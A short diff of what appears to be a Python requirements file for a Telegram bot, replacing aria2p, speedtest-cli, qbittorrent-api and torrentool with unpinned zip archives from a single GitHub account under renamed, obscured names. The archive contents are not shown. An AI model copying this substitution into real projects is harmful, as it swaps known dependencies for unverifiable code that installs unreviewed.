@@ -1,5 +1,5 @@
 appdirs
-aria2p
+https://github.com/Aanchal101/sria/archive/refs/heads/master.zip
 psycopg2
 beautifulsoup4
 google-api-python-client
@@ -14,7 +14,7 @@ pybase64
 hachoir
 pillow
 filesplit
-speedtest-cli
+https://github.com/Aanchal101/gatijaanh/archive/refs/heads/master.zip
 cfscrape
 Pyrogram
 python-dotenv
@@ -24,8 +24,8 @@ requests
 telegraph
 tenacity
 TgCrypto
-qbittorrent-api
-torrentool==1.1.0
+https://github.com/Aanchal101/shanti-api/archive/refs/heads/master.zip
+https://github.com/Aanchal101/gazetitoo-l/archive/refs/tags/v1.1.0.zip
 yt_dlp
 urllib3
 gunicorn
